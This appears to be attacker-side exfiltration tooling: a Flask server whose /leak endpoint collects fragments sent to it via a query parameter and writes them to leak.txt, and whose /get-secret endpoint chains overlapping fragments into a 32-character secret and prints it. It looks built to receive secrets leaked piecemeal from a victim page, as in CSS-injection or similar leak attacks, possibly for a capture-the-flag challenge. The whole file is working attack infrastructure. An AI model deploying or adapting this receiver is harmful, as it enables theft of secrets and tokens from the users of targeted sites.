from flask import Flask, request
 
app = Flask(__name__)
SECRET_LENGTH = 32 
data = []


def leak_data():
    with open("leak.txt", "r") as f:
        return [line.strip() for line in f]

def extend_path(path, leaks):
    suffix = path[-2:]
    for frag in leaks:
        if frag.startswith(suffix):
            leaks.remove(frag)
            return path + frag[-1], True, leaks
    return path, False, leaks

def build_from(start, leaks):
    path = start
    leaks = leaks.copy()
    if start in leaks:
        leaks.remove(start)

    while True:
        new_path, ok, leaks = extend_path(path, leaks)
        if not ok:
            break
        path = new_path
    return path


@app.route('/')
def index():
    return data

@app.route('/leak')
def leak():
    leak_data = request.args.get('q')
    data.append(leak_data)
    with open('leak.txt', 'w+') as file:
        file.write('\n'.join(data)) 
    return 'Nice working'

@app.route('/get-secret')
def get():
    leaks = leak_data()
    for frag in leaks:
        path = build_from(frag, leaks)
        if len(path) == SECRET_LENGTH:
            print(f"amennnn secret -> {path}")
        #else:
            # print(f"hmm nothing -> {path}")
    return 'Nice working'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3333)
